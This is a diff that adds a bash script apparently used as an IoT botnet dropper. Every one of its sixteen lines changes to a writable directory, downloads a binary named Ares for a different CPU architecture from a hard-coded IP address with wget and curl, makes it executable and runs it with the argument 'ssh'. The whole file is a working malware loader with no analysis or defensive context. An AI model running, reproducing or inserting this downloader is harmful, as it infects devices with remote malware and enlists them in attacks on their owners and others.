@@ -1,0 +1,17 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.arm; curl -O http://45.14.151.249/33bi/Ares.arm;cat Ares.arm >aabb;chmod +x *;./aabb ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.arm5; curl -O http://45.14.151.249/33bi/Ares.arm5;cat Ares.arm5 >aabb;chmod +x *;./aabb ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.arm6; curl -O http://45.14.151.249/33bi/Ares.arm6;cat Ares.arm6 >aabb;chmod +x *;./aabb ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.arm7; curl -O http://45.14.151.249/33bi/Ares.arm7;cat Ares.arm7 >aabb;chmod +x *;./aabb ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.x86; curl -O http://45.14.151.249/33bi/Ares.x86;cat Ares.x86 >aabb;chmod +x *;./aabb ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.i686; curl -O http://45.14.151.249/33bi/Ares.i686;cat Ares.i686 >aabb;chmod +x *;./aabb ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.mips; curl -O http://45.14.151.249/33bi/Ares.mips;cat Ares.mips >aabb;chmod +x *;./aabb ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.mips64; curl -O http://45.14.151.249/33bi/Ares.mips64;cat Ares.mips64 >aabb;chmod +x *;./aabb ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.arm4tl; curl -O http://45.14.151.249/33bi/Ares.arm4tl;cat Ares.arm4tl >aabb;chmod +x *;./aabb ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.arm4eb; curl -O http://45.14.151.249/33bi/Ares.arm4eb;cat Ares.arm4eb >aabb;chmod +x *;./aabb ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.arc; curl -O http://45.14.151.249/33bi/Ares.arc;cat Ares.arc >aabb;chmod +x *;./aabb ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.mpsl; curl -O http://45.14.151.249/33bi/Ares.mpsl;cat Ares.mpsl >aabb;chmod +x *;./aabb ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.ppc; curl -O http://45.14.151.249/33bi/Ares.ppc;cat Ares.ppc >aabb;chmod +x *;./aabb ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.sh4; curl -O http://45.14.151.249/33bi/Ares.sh4;cat Ares.sh4 >aabb;chmod +x *;./aabb ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.spc; curl -O http://45.14.151.249/33bi/Ares.spc;cat Ares.spc >aabb;chmod +x *;./aabb ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.151.249/33bi/Ares.m68k; curl -O http://45.14.151.249/33bi/Ares.m68k;cat Ares.m68k >aabb;chmod +x *;./aabb ssh
